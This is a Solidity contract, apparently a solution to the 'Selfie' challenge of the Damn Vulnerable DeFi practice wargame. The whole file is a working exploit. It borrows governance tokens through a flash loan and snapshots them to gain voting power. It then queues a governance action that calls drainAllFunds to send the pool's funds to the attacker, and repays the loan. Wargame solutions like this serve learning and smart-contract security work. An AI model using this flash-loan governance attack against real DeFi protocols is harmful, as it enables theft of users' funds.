pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
contract SelfieAttack {
	
	using Address for address;

	SimpleGovernance public governance;
	SelfiePool selfiePool;
	address owner;

	// ERC20Snapshot public token;
	constructor(address governanceTokenAddress, address tokenAddress){

		owner = msg.sender;

		governance = SimpleGovernance(governanceTokenAddress);
		// token = ERC20Snapshot(tokenAddress);
	}

	function attack(address flashPoolAddress, uint256 amount) external {

		selfiePool = SelfiePool(flashPoolAddress);

		selfiePool.flashLoan(amount);

	}

	function receiveTokens(address tokenAddress, uint256 amount) external returns (uint256) {

		DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);

		//take snapshot to ensure votes
		token.snapshot();

		uint256 actionId = governance.queueAction(
			address(selfiePool), // receiver: action executed in pool
			abi.encodeWithSignature(
				"drainAllFunds(address)",
				owner
			), // data
			0);
	
		// payback flashloan
		token.transfer(msg.sender, amount);

		return actionId;
	}
}